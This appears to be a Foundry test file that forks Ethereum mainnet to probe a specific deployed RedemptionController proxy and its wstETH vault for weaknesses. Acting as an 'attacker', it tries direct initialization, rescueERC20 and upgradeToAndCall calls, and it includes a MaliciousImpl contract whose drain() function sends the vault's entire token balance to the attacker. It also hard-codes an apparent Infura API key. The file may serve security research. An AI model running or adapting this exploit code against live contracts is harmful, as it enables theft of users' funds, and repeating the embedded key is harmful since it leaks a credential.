// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IRedemptionController {
    function UNDERLYING() external view returns (address);
    function VAULT() external view returns (address);
    function redeem(uint256 amount, address to) external;
    function rescueERC20(address token, address to, uint256 amount) external;
    function owner() external view returns (address);
    function paused() external view returns (bool);
    function getRedemptionContracts() external view returns (address[] memory);

    // UUPS proxy functions
    function proxiableUUID() external view returns (bytes32);
    function upgradeToAndCall(address newImplementation, bytes memory data) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
}

contract RedemptionDelegatecall is Test {
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    // EIP-1967 slots
    bytes32 constant IMPL_SLOT = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
    bytes32 constant ADMIN_SLOT = bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1);

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeRedemptionControllerProxy() public view {
        console.log("=== REDEMPTION CONTROLLER PROXY ANALYSIS ===\n");

        // Check if it's a UUPS proxy
        bytes32 implSlot = vm.load(REDEMPTION_CONTROLLER, IMPL_SLOT);
        address impl = address(uint160(uint256(implSlot)));
        console.log("Implementation slot value:", impl);

        if (impl != address(0)) {
            console.log("RedemptionController IS a proxy!");
            console.log("Implementation:", impl);

            // Check implementation code
            bytes memory implCode = impl.code;
            console.log("Implementation code size:", implCode.length);
        }

        // Check admin slot
        bytes32 adminSlot = vm.load(REDEMPTION_CONTROLLER, ADMIN_SLOT);
        address admin = address(uint160(uint256(adminSlot)));
        console.log("Admin slot value:", admin);

        // Try to get proxiableUUID
        try IRedemptionController(REDEMPTION_CONTROLLER).proxiableUUID() returns (bytes32 uuid) {
            console.log("\nproxiableUUID:");
            console.logBytes32(uuid);
            console.log("Expected IMPL_SLOT:");
            console.logBytes32(IMPL_SLOT);
        } catch {
            console.log("No proxiableUUID function");
        }
    }

    function test_CheckImplementationVulnerabilities() public {
        console.log("=== IMPLEMENTATION VULNERABILITY CHECK ===\n");

        // Get implementation address
        bytes32 implSlot = vm.load(REDEMPTION_CONTROLLER, IMPL_SLOT);
        address impl = address(uint160(uint256(implSlot)));

        if (impl == address(0)) {
            console.log("Not a proxy or no implementation set");
            return;
        }

        console.log("Implementation:", impl);

        // Check if implementation can be initialized
        vm.startPrank(attacker);

        console.log("\nTrying to call implementation directly...");

        // Try initialize
        (bool success, bytes memory data) = impl.call(
            abi.encodeWithSignature("initialize(address,address,address)", attacker, VAULT, wstETH)
        );
        console.log("Initialize success:", success);

        // Try to call rescueERC20 on implementation
        (success, data) = impl.call(
            abi.encodeWithSignature("rescueERC20(address,address,uint256)", wstETH, attacker, 1e18)
        );
        console.log("rescueERC20 on impl success:", success);

        // Try upgradeToAndCall on implementation
        (success, data) = impl.call(
            abi.encodeWithSignature("upgradeToAndCall(address,bytes)", attacker, "")
        );
        console.log("upgradeToAndCall on impl success:", success);

        vm.stopPrank();
    }

    function test_AnalyzeDelegateCallTargets() public view {
        console.log("=== DELEGATECALL TARGET ANALYSIS ===\n");

        // The RedemptionController has 4 DELEGATECALLs
        // These are likely UUPS upgrade pattern calls

        bytes memory code = REDEMPTION_CONTROLLER.code;
        console.log("Code size:", code.length);

        // Count opcodes
        uint256 delegatecallCount = 0;
        uint256 callCount = 0;
        uint256 staticcallCount = 0;

        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) delegatecallCount++;  // DELEGATECALL
            if (uint8(code[i]) == 0xf1) callCount++;           // CALL
            if (uint8(code[i]) == 0xfa) staticcallCount++;     // STATICCALL
        }

        console.log("DELEGATECALL opcodes:", delegatecallCount);
        console.log("CALL opcodes:", callCount);
        console.log("STATICCALL opcodes:", staticcallCount);
    }

    function test_CheckRedemptionContracts() public view {
        console.log("=== REDEMPTION CONTRACTS DEEP ANALYSIS ===\n");

        address[] memory redemptions = IRedemptionController(REDEMPTION_CONTROLLER).getRedemptionContracts();

        for (uint i = 0; i < redemptions.length; i++) {
            console.log("\n--- Redemption", i, "---");
            address r = redemptions[i];
            console.log("Address:", r);

            // Check if it's a proxy
            bytes32 implSlot = vm.load(r, IMPL_SLOT);
            address impl = address(uint160(uint256(implSlot)));
            if (impl != address(0)) {
                console.log("Is UUPS proxy, implementation:", impl);
            }

            // Count opcodes
            bytes memory code = r.code;
            uint256 delegatecallCount = 0;
            for (uint j = 0; j < code.length; j++) {
                if (uint8(code[j]) == 0xf4) delegatecallCount++;
            }
            console.log("DELEGATECALL opcodes:", delegatecallCount);

            // Check for interesting functions
            (bool success,) = r.staticcall(
                abi.encodeWithSignature("executeAction(bytes,uint8[],bytes32[])")
            );
            if (success) {
                console.log("HAS executeAction function!");
            }

            (success,) = r.staticcall(
                abi.encodeWithSignature("execute(address,bytes)")
            );
            if (success) {
                console.log("HAS execute function!");
            }
        }
    }

    function test_ExploitViaUpgrade() public {
        console.log("=== EXPLOIT VIA UPGRADE ATTEMPT ===\n");

        vm.startPrank(attacker);

        // Deploy malicious implementation
        MaliciousImpl malicious = new MaliciousImpl(VAULT, wstETH, attacker);
        console.log("Malicious impl deployed:", address(malicious));

        uint256 vaultBalanceBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBalanceBefore / 1e18);

        // Try to upgrade the proxy to our malicious implementation
        console.log("\nTrying upgradeToAndCall...");
        try IRedemptionController(REDEMPTION_CONTROLLER).upgradeToAndCall(
            address(malicious),
            abi.encodeWithSignature("drain()")
        ) {
            console.log("CRITICAL: Upgrade succeeded!");
        } catch Error(string memory reason) {
            console.log("Upgrade failed:", reason);
        } catch (bytes memory data) {
            console.log("Upgrade failed (raw):");
            if (data.length >= 4) {
                bytes4 selector = bytes4(data);
                console.logBytes4(selector);
            }
        }

        uint256 vaultBalanceAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBalance = IERC20(wstETH).balanceOf(attacker);

        console.log("\nResults:");
        console.log("Vault wstETH after:", vaultBalanceAfter / 1e18);
        console.log("Attacker wstETH:", attackerBalance / 1e18);

        vm.stopPrank();
    }
}

contract MaliciousImpl {
    address public vault;
    address public token;
    address public owner;

    constructor(address _vault, address _token, address _owner) {
        vault = _vault;
        token = _token;
        owner = _owner;
    }

    function drain() external {
        uint256 balance = IERC20(token).balanceOf(vault);
        // Use the approval to drain
        IERC20(token).transferFrom(vault, owner, balance);
    }

    function proxiableUUID() external pure returns (bytes32) {
        return bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
    }
}

